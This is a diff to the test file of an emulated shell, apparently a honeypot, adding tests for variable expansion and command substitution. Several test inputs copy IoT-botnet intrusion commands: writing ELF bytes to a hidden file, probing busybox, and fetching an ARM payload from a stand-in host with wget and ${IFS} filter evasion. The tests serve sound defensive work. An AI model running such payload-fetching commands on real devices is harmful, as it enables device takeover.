@@ -374,7 +374,41 @@ test.case("shell: groups run in a subshell") do
   test.assert_eq(run(sh, "((((echo four))))"), "four\n")
   test.assert_eq(run(sh, "(((((echo five)))))"), "")
   test.assert_eq(run(sh, "(exit); echo still"), "still\n")
+  test.assert_eq(run(sh, "X=1; (X=2; Y=3; hostname in; echo $X$Y); echo $X[$Y]; hostname"), "23\n1[]\nlocalhost\n")
   test.assert_eq(shell.closed(sh), nil)
+end
+
+test.case("parse: parameters") do
+  let vars = {E: "", S: "a b", X: "x"}
+  let lookup = fn(name) if has_key(vars, name) then vars[name] else "" end end
+  let words = fn(line) shell.parse(line, nil, lookup)[0].words end
+  test.assert_eq(words('echo -n${E}e $E $S "$S" "$E" a$X$X ${X}y $Xy'), ["echo", "-ne", "a", "b", "a b", "", "axx", "xy"])
+  test.assert_eq(words('echo \'$X\' \\$X $ a$ $% ${X'), ["echo", "$X", "$X", "$", "a$", "$%", '${X'])
+  test.assert_eq(words('echo ${A:-b} $? "${?}"'), ["echo", '${A:-b}', ""])
+  test.assert_eq(shell.parse("echo $X; ls")[0].words, ["echo", "$X"])
+  test.assert_eq(table.map(shell.parse("a $X && (b) | c # d"), fn(c) c.src end), ["a $X ", " (b) ", " c "])
+end
+
+test.case("shell: variables expand as each command runs") do
+  let sh = logged_in_shell()
+  let r = shell.line(sh, "echo -n" + '${MONITOR}' + "e '\\x7F\\x45\\x4C\\x46' >> .d && /bin/busybox HISILICON")
+  test.assert_eq(r.events[1], {kind: "echo", bytes: chr(127) + "ELF"})
+  r = shell.line(sh, "cd /tmp; F=x.arm7; wget" + '${IFS}' + "http://h/$F; A=1 echo [$A]")
+  test.assert_eq(table.filter(r.events, fn(e) e.kind == "url" end), [{kind: "url", url: "http://h/x.arm7", via: "wget"}])
+  test.assert(string.ends_with(r.out, "[]\n# "))
+  test.assert_eq(run(sh, "echo $HOME $$ $0 $#[$1] \"$UNSET\"x"), "/root 611 -sh 0[] x\n")
+  test.assert_eq(run(sh, "nope 2>/dev/null; echo $?; false || echo $?; echo $?"), "127\n1\n0\n")
+  test.assert_eq(run(sh, "export A=1 B; echo $A$B; unset A; echo [$A]"), "1\n[]\n")
+  test.assert_eq(run(sh, "echo $F"), "x.arm7\n")
+  test.assert_eq(run(sh, "$UNSET && echo y"), "y\n")
+  test.assert_eq(run(sh, "echo \"a" + '${IFS}' + "b\""), "a \t\nb\n")
+end
+
+test.case("shell: substitutions run when their command does") do
+  let sh = logged_in_shell()
+  let r = shell.line(sh, "false && echo $(wget http://s/x); B=b; echo $(echo $B)")
+  test.assert_eq(table.filter(r.events, fn(e) e.kind == "url" end), [])
+  test.assert_eq(r.out, "b\n# ")
 end
 
 test.case("shell: binaries read as an ARM executable") do
